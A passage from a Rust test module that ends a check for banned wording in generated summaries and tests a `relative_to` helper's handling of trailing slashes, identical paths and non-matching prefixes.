                    "{summary:?} contains banned framing {banned:?}"
                );
            }
            assert!(!summary.is_empty());
        }
    }

    #[test]
    fn relative_paths_handle_trailing_slashes_and_non_matches() {
        assert_eq!(relative_to("/work/project/a.js", "/work/project"), "a.js");
        assert_eq!(relative_to("/work/project/a.js", "/work/project/"), "a.js");
        assert_eq!(relative_to("/work/project", "/work/project"), ".");
        // A prefix that does not match leaves the path alone rather than mangling it.
        assert_eq!(relative_to("/other/a.js", "/work/project"), "other/a.js");
        assert_eq!(relative_to("/other/a.js", ""), "other/a.js");
    }
}
